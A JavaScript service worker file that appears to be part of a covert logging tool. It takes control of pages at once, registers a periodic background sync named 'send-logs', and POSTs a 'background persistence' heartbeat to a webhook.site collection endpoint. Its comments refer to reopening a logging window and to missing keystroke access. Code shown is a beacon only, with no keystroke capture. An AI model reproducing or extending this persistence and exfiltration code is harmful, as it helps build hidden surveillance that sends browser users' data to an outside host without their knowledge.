self.addEventListener('install', (event) => {
    event.waitUntil(self.skipWaiting());
    console.log('Service Worker installed');
});

self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
    console.log('Service Worker activated');
});

// Periodically send a heartbeat or attempt to reopen a logging window
self.addEventListener('fetch', (event) => {
    // Minimal interception, just log activity if needed
});

// Background sync (experimental, not widely supported for this use case)
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'send-logs') {
        event.waitUntil(sendLogsFromBackground());
    }
});

async function sendLogsFromBackground() {
    // Placeholder: Attempt to send cached data if any
    // Limited by lack of direct keystroke access in Service Worker
    try {
        await fetch('https://webhook.site/5c952e38-7c8b-4004-af93-16fed30fa52c', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device: 'ServiceWorkerHeartbeat',
                message: 'Attempting background persistence',
                timestamp: new Date().toISOString()
            })
        });
    } catch (e) {
        console.error('Background send failed');
    }
}